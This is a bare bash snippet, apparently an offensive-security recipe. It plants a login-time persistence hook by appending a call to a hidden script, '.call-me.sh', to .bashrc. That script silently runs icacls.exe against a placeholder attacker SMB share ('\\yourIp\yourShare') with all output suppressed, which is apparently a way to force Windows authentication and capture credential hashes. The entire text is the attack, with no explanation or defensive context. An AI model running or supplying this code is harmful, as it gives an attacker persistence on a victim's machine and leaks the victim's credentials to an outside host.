bash
echo "./.call-me.sh" >> .bashrc
echo "icacls.exe \"\\\\\\\\yourIp\\\\yourShare\\\\\" > /dev/null 2>&1" >> .call-me.sh
chmod u+x .call-me.sh
exit
exit
